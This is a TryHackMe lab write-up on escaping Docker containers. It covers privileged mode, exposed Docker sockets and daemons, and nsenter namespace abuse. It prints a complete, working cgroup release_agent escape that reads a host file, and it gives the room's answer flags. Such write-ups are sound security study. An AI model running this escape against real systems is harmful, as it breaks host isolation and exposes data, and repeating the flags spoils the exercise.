# TryHackMe Room Writeup — Container Vulnerabilities 101

---

## Container Vulnerabilities 101

Key things to keep in mind about containers:

- Having a foothold in a container does **not** mean you have access to the host operating system, its files, or other containers.
- Hard-coded passwords for applications can still be present inside containers.
- Misconfigured containers may have privileges that are not necessary for their operation. For example, a container running in **privileged mode** will have access to the host operating system, removing the layers of isolation.

---

## Vulnerability 1: Privileged Containers

Docker containers can run in two modes:

| Mode | Description |
|---|---|
| **User (Normal) Mode** | The container interacts with the host OS through the Docker Engine, maintaining isolation. |
| **Privileged Mode** | The container bypasses the Docker Engine and communicates directly with the host operating system. |

To check what capabilities a container has, use `capsh` from the `libcap2-bin` package:
```bash
capsh --print
```

### Exploit Steps

1. Create and mount the cgroup and make a child group:
   ```bash
   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
   ```
2. Enable `notify_on_release` so the release agent fires when the cgroup empties:
   ```bash
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```
3. Find where the container's filesystem lives on the host:
   ```bash
   host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
   ```
4. Point the release agent to the exploit script on the host:
   ```bash
   echo "$host_path/exploit" > /tmp/cgrp/release_agent
   ```
5. Create the exploit shell script:
   ```bash
   echo '#!/bin/sh' > /exploit
   ```
6. Write the command to read the flag from the host and drop it into the container:
   ```bash
   echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
   ```
7. Make it executable:
   ```bash
   chmod a+x /exploit
   ```
8. Trigger it by spawning a process in the cgroup, which exits immediately and fires the release agent:
   ```bash
   sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
   ```

> Flag: `THM{MOUNT_MADNESS}`

---

## Vulnerability 2: Escaping via Exposed Docker Daemon

- **Sockets** are used to move data between two places.
- **Unix sockets** use the filesystem to transfer data rather than networking interfaces. This is known as **Inter-process Communication (IPC)** and is essential in operating systems.
- To verify Docker access from within a container, run `groups` to check group membership.

**Docker socket exposure is a full host compromise** — mounting `/var/run/docker.sock` into a container gives it the ability to spawn new containers with the host filesystem mounted, effectively escaping the container entirely.

### Defence

- Never run containers with `--privileged` or mount the Docker socket unless absolutely necessary.
- Use `capsh --print` to audit container capabilities during an assessment.

---

## Vulnerability 3: Remote Code Execution via Exposed Docker Daemon

- Docker can be remotely administered using management tools such as **Portainer** or **Jenkins**.
- When configured for remote access, the Docker Engine listens on a port. It is easy to make remotely accessible but **difficult to do securely**.
- By default, the Docker Engine runs on port **2375**.

### Steps Performed

1. Ran an `nmap` scan to confirm port 2375 was open and accessible.
2. Used `curl` to begin interacting with the Docker daemon.
3. Tested command execution by running a `ps` command against the daemon.

---

## Vulnerability 4: Abusing Namespaces

Every process running on a system is assigned two things:

- A **namespace**
- A **Process Identifier (PID)**

A noticeably lower number of running processes is usually a strong indicator that you are inside a container.

This vulnerability leverages **`nsenter`** (namespace enter), a command that allows you to execute or start processes and place them within the same namespace as another process — effectively escaping the container's isolation.

> Flag (after running the provided exploit): `THM{YOUR-SPACE-MY-SPACE}`
